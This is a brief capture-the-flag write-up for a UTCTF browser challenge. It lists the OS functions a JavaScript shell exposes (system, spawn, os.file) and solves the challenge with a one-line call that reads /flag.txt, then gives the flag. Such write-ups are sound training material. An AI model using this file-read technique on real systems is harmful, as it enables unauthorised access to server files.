#### Challenge:

Help me show Bob how slow his browser is! [http://web1.utctf.live:8124/](http://web1.utctf.live:8124/)

---

#### Solution:

- upon playing around with `jsshell` we see that it has `help()` that shows all usable functions these are the most interesting for us

```console
os - interface object with 8 entries
  getenv(variable)
  getpid()
  system(command)
  spawn(command)
  kill(pid[, signal])
  waitpid(pid[, nohang])
  os.file - interface object with 6 entries
  os.path - interface object with 2 entries
```

```js
console.log(os.file.readFile("/flag.txt"));
```

---

<details><summary>FLAG:</summary>

```
utflag{d1d_y0u_us3_a_j1t_bug_0r_nah}
```

</details>
<br/>
